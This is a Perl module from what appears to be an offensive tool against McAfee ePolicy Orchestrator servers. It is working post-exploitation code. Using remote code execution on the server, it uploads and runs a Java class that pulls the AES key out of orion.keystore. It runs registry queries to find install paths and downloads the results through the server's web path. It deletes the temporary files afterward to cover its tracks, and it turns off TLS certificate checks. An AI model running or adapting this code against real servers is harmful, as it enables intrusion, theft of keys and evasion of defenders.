package Epowner::Epo;

use Switch;
use strict;
use warnings;

# git-issue-1
IO::Socket::SSL::set_ctx_defaults(SSL_verify_mode => SSL_VERIFY_NONE);
$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;


sub mode_gatherinfo_aes_key_from_orion_keystore {

	my $this = shift;


        # Do we have privileged code execution ?
        if(not $this->have_srv_exec_priv()){
                $this->print_err("[-] ERROR (mode_gatherinfo_aes_key_from_orion_keystore): You don't have sufficient RCE privileges to perform this action\n");
                exit;
        }


        #===================
        # GET AES Key
        #===================

        # generate random filename for storing Java output
        my $out_rnd_file = '.txt';
        my @chars=('0'..'9', 'a'..'z', 'A'..'Z');
        foreach (1..4)  { $out_rnd_file = $chars[rand @chars] . $out_rnd_file ; }

        # keystore location on server
	my $folder = $this->{server_tomcat_folder} || $this->{server_tomcat_folder_default};
        my $keystore_path = $folder . "/keystore/orion.keystore";

        # Java location on server
	$folder = $this->{server_install_folder} || $this->{server_install_folder_default} ;
	my $java_path = $folder . "/JRE/bin/java.exe";

        # Dumpkey class file
        my $dumpkey_class = fileparse($this->{tool_dumpkey});

        # Class path = DBFolder
        my $classpath = $this->{server_db_folder} || $this->{server_db_folder_default} ;

        # where to store AES key ?
        my $outfile_path = $classpath . "/Software/" . $out_rnd_file;


        # Upload DumpKey.call under DBFolder
        #======================================
        $this->mode_server_upload_from_file(    $this->{tool_dumpkey},     # source filename
                                                $dumpkey_class          # dest filename
        );


        # Open keystore and extract AES symKey. Save the key in $out_rnd_file
        #=====================================================================
        $dumpkey_class =~ s/\.class$//g;
        $this->mode_server_exec_send(
                "\"$java_path -classpath $classpath $dumpkey_class $keystore_path $outfile_path\""
        );


        # Download the random filename back (the AES Key)
        my $server_host = $this->{server_host};
        my $server_port = $this->{server_port};
        my $uri = "https://$server_host:$server_port/Software/$out_rnd_file";
        my $aes_key = $this->http_poll_uri_get($uri);
        if( $aes_key eq 0){
                print "ERROR: Can't download AES Key \n";
                return 0;
        }

	my $db_folder = $this->{server_db_folder} || $this->{server_db_folder_default};
        # delete temp file created on server
        $this->mode_server_exec_send(
                "del /F ${db_folder}\\Software\\${out_rnd_file} & "  .
                "del /F ${db_folder}\\RepoCache\\${out_rnd_file} & " .
                "del /F ${db_folder}\\${dumpkey_class}.class " 
        );


        print "[*] AES-128 symKey extracted from ePo Keystore (saving): ";
	$this->print_info_l2(unpack("H*", $aes_key));
	print "\n"; 
        
	$this->{aes_symkey_keystore} = unpack("H*", $aes_key);

	return 1;

}

sub mode_gatherinfo_installation_path {

	my $this = shift;

        # Do we have privileged code execution ?
        if(not $this->have_srv_exec_priv()){
                $this->print_err("[-] ERROR (mode_gatherinfo_installation_path): You don't have sufficient RCE privileges to perform this action\n");
                exit;
        }


        $this->print_info_l1("[*] Call to ModeGatherInfo\n");
        $this->print_info_l2("    Parameters: ");
        print "Retrieve DBFolder installation path\n";


	my $db_folder = '';
	my $all_folders = '';

        my $server_host = $this->{server_host};
        my $server_port = $this->{server_port};

        my $get_request = HTTP::Request->new;
	$get_request->method('GET');

	my $user_agent  = LWP::UserAgent->new (ssl_opts => { verify_hostname => 0, SSL_verify_mode => SSL_VERIFY_NONE });

	# generate randown filename
	my @chars=('0'..'9', 'a'..'z', 'A'..'Z');
        my $rnd_file = '.txt';
        foreach (1..4)  { $rnd_file = $chars[rand @chars] . $rnd_file ; }	


	#==================================================================
        # Get 'DBFolder' from registry and write it under /Software/
        #==================================================================
        $this->mode_server_exec_send(
	"\"for /f \"usebackq tokens=3\" %G in (`reg query \"HKLM\\Software\\network associates\\epolicy Orchestrator\" /v \"DBFolder\" 2^>NUL ^| findstr DBFolder`) do (echo %G >  %G/Software/$rnd_file)\""
#	"\"for /f \"usebackq tokens=3\" %G in (`reg query \"HKLM\\Software\\Wow6432Node\\network associates\\epolicy Orchestrator\" /v \"DBFolder\" 2^>NUL ^| findstr DBFolder`) do (echo %G >  %G/Software/$rnd_file)\""
	);        
	

	# Download the random filename 
        my $uri = "https://$server_host:$server_port/Software/$rnd_file";
	$db_folder = $this->http_poll_uri_get($uri);
        if(not $db_folder){
                $this->print_err ("[-] ERROR (mode_gatherinfo_installation_path): can't get DBFolder entry from registry \n");
                exit;
        }



	# check if we found DB in the path
	if($db_folder !~ /DB/){
		print "[-] ERROR (mode_gatherinfo_installation_path): db_folder looks invalid '$db_folder'\n";
		return 0;
	}

	# remove carriage return/newline/ending space
	$db_folder =~ s/\r\n//g;
	$db_folder =~ s/^\s+//g;
	$db_folder =~ s/\s+$//g;
	$db_folder =~ s/\//\\/g;
	
	# save it
	$this->{server_db_folder} = $db_folder;



        #================================================================================
        # Get the others '*Folder' from registry , and save them under DBFolder\Software\
        #================================================================================

	# Make a new random file
	my $rnd_file2 = '.txt';
        foreach (1..4)  { $rnd_file2 = $chars[rand @chars] . $rnd_file2 ; }

        $this->mode_server_exec_send(
        "\"for /f \"usebackq tokens=1,3\" %G in (`reg query \"HKLM\\Software\\network associates\\epolicy Orchestrator\" 2^>NUL ^| findstr Folder`) do (echo %G---%H >>  $db_folder\\Software\\$rnd_file2)\""
        );


        # Download the random filename 
        $uri = "https://$server_host:$server_port/Software/$rnd_file2";
        $all_folders = $this->http_poll_uri_get($uri);
        if(not $all_folders){
                $this->print_err ("[-] ERROR (mode_gatherinfo_installation_path): can't get *Folder entries from registry \n");
                exit;
        }



        # convert '/' into '\', remove spaces, newlines, etc ..
        # however, this works : "DEL C:\PROGRA~1\McAfee\EPOLIC~1\DB\FILE.txt"
	$all_folders =~ s/\r\n/@@/g;
        $all_folders =~ s/\s+//g;
        $all_folders =~ s/\//\\/g;


	# $all_folders looks like:
	# InstallFolder---C:\PROGRA~1\McAfee\EPOLIC~1@@TomcatFolder---C:\PROGRA~1\McAfee\EPOLIC~1\Server@@ApacheFolder---C:\PROGRA~1\McAfee\EPOLIC~1\Apache2 ...

	my @folders = split(/@@/, $all_folders);
	foreach my $f (@folders){
		my ($key, $val) = split(/---/, $f);
		#print "key: '$key' , val: '$val'\n";
		# Save them
		switch($key) {
			case "InstallFolder"	{ $this->{server_install_folder} = $val; }
			case "TomcatFolder"	{ $this->{server_tomcat_folder} = $val; }
			case "ApacheFolder"	{ $this->{server_apache_folder} = $val; }
		}	
	}
        

        # delete temp file created on server
        $this->mode_server_exec_send(
		"del /F $db_folder\\Software\\$rnd_file & "  .
		"del /F $db_folder\\Software\\$rnd_file2 & " .
		"del /F $db_folder\\RepoCache\\$rnd_file & " .
		"del /F $db_folder\\RepoCache\\$rnd_file2 " 
	);



	print "[*] Retrieved folders (saving..): \n";
	print "       InstallFolder: $this->{server_install_folder}\n";
	print "       DBFolder:      $this->{server_db_folder}\n";
	print "       TomcatFolder:  $this->{server_tomcat_folder}\n";
	print "       ApacheFolder:  $this->{server_apache_folder}\n";


}
1;
